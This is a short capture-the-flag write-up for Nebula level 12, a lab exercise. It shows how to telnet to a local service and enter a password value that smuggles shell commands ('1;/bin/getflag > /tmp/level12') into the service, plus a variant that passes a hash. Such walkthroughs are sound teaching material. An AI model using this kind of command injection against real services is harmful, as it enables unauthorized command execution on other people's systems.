.. _nebula12:

.. role:: bash(code)
	  :language: bash

Nebula 12
=========

Basic Information
-----------------

**Home Page** https://exploit-exercises.com/nebula/level12/

Solution
--------

Execute :bash:`telnet` on localhost on port 50001

:bash:`$ telnet 127.0.0.1 50001`

When password is asked

:bash:`Password: 1;/bin/getflag > /tmp/level12;echo 1`

It will say better luck next time and it will close the connection

Then simply use cat the output file

:bash:`cat /tmp/level12`

In case you want to pass the hash it will be this way

:bash:`$ telnet 127.0.0.1 50001`

:bash:`Password: 4754a4f4bd5787accd33de887b9250a0691dd198;echo 1`

